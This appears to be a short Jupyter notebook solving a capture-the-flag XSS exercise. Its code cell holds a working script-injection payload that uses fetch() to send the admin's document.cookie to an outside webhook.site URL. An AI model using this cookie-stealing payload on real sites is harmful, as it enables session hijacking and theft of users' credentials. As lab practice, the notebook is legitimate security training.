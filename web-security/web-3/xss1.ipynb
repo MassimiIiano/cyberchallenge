{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "vscode": {
     "languageId": "html"
    }
   },
   "source": [
    "on the site we we can inpjt script tags in the input field and it will be executed on the page\n",
    "```html\n",
    "<script>alert('hello')</script> # returns an alert\n",
    "```\n",
    "\n",
    "we want the get the flag hidden in the admin cookee  `document.cookie`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "html"
    }
   },
   "outputs": [],
   "source": [
    "<script>fetch('https://webhook.site/0cc67171-c7dc-4706-93df-d653427f627a?admin='+document.cookie)</script>"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
